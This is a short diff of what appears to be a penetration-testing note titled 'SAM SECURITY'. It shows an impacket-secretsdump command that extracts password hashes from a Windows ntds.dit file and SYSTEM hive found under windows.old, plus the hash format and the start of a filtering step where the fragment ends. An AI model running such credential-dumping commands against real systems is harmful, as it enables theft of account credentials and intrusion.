@@ -1,11 +1,13 @@
+SAM SECURITY
 ```
 cd C:\windows.old\Windows\System32
 ```
 
-
 ```
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > hash.txt
 ```
+
+User : LT : NT  hash
 
 Filter the hashes 
 ```
